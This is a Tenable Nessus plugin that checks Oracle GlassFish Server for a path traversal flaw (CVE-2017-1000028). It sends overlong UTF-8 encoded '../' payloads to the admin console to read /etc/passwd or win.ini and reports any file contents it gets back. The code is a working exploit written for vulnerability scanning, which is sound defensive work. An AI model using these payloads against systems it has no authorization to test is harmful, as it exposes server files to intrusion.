#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(110192);
  script_version("1.4");
  script_cvs_date("Date: 2018/06/14 12:21:47");

  script_cve_id("CVE-2017-1000028");
  script_xref(name:"EDB-ID", value:"39441");

  script_name(english:"Oracle GlassFish Server Path Traversal");
  script_summary(english:"Attempts to access arbitrary files.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web application server is affected by a path traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The instance of Oracle GlassFish Server running on the remote host is
affected by an authenticated and unauthenticated path traversal vulnerability. 
Remote attacker can exploit this issue, via a specially crafted HTTP request, 
to access arbitrary files on the remote host.");
  # https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
  script_set_attribute(attribute:"see_also",value:"http://www.nessus.org/u?159578ad");
  script_set_attribute(attribute:"solution", value:
"Contact to vendor for patch options.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/07/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/05/30");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:glassfish_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("glassfish_console_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/glassfish", "www/glassfish/console");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("glassfish.inc");

##
# Combine payload string for exploitation of issue
#
# @param [file:string] target file to read from server
# @param [path:string] piece of URL that triggers vulnerable Java component
# @param [payl:array] contains encoding pattern for '.' and '/'
# @param [depth:int] depth of payloads needed
#
# @return string payload to send to the server
##
function prepare_payload(file, path, payl, depth)
{
  var i, piece, pieces_of_file;
  var url = '/theme/';

  if (empty_or_null(file) || empty_or_null(path) || 
    empty_or_null(payl) || empty_or_null(depth))
    audit(AUDIT_FN_FAIL, 'prepare_payload');

  if (depth < 2)
    audit(AUDIT_FN_FAIL, 'prepare_payload');

  url += path;

  # Generate enough encoded /.. sequences 
  for (i=0; i<depth; i++)
    url += payl['/'] + payl['.'] + payl['.'];

  # Encode / in file name
  pieces_of_file = split(file, sep:'/', keep:false);

  for (i=1; i<len(pieces_of_file); i++)
    url += payl['/'] + pieces_of_file[i];

  return url;
}

##
# Select pieces from input parameters to generate payload
#
# @param [files:string] target file to read from server
# @param [paths:string] piece of URL that triggers vulnerable Java component
# @param [payloads:array] contains encoding pattern for '.' and '/'
# @param [depth:int] depth of payloads needed 
#
# @return list of urls that we have to test
##
function gather_pieces(files, paths, payloads, depth)
{
  var file, path, payl;
  var urls_list = make_list();

  if (empty_or_null(files) || empty_or_null(paths) || 
    empty_or_null(payloads) || empty_or_null(depth))
    audit(AUDIT_FN_FAIL, 'gather_pieces');

  if (depth < 2)
    audit(AUDIT_FN_FAIL, 'gather_pieces');

  foreach file (files)
    foreach path (paths)
      foreach payl (payloads)
        urls_list[max_index(urls_list)] =
          prepare_payload(file:file, path:path, payl:payl, depth:depth);

  return urls_list;
}

#
# Main
#

# Check GlassFish & GlassFish Admin Console
get_kb_item_or_exit('www/glassfish');
get_kb_item_or_exit('www/glassfish/console');

var port = get_glassfish_console_port(default:4848);

# Parameters section
var depth = 10;
var files, paths, res, url;
var vuln, req, file;
var payloads = [{'.':'%c0%ae', '/':'%c0%af'},
  {'.':'%e0%80%ae', '/':'%c0%af'},
  {'.':'.', '/':'%e0%80%af'},
  {'.':'%f0%80%80%ae', '/':'%e0%80%af'}
];
var file_pats = {"/etc/passwd":"root:.*:0:[01]:",
  "/winnt/win.ini":"^\[[a-zA-Z\s]+\]|^; for 16-bit app support",
  "/windows/win.ini":"^\[[a-zA-Z\s]+\]|^; for 16-bit app support"
};
var os = get_kb_item('Host/OS');

# Exploitation check
if (!empty_or_null(os) && (report_paranoia < 2))
{
  if ("Windows" >< os)
  {
    files = ['/windows/win.ini', '/winnt/win.ini'];
    paths = ['META-INF', 'com/sun', 'META-INF/test'];
  }
  else
  {
    files = ['/etc/passwd'];
    paths = ['META-INF'];
  }
}
else
{
  files = ['/etc/passwd', '/windows/win.ini', '/winnt/win.ini'];
  paths = ['META-INF', 'com/sun', 'META-INF/test'];
}

foreach url (gather_pieces(files:files, paths:paths, payloads:payloads, depth:depth))
{
  res = get_glassfish_res(url:url, port:port);

  foreach file (files)
    if (egrep(pattern:file_pats[file], string:res[2]))
    {
      security_report_v4(
        port        : port,
        severity    : SECURITY_WARNING,
        extra       : 'The following HTTP request was sent:\n\n' +
          build_glassfish_url(url:url, port:port) + '\n\n' +
          'The contents of file obtained:\n\n' + chomp(res[2])
      );
      exit(0);
    }
}

audit(AUDIT_LISTEN_NOT_VULN, "GlassFish Server", port);
exit(0);
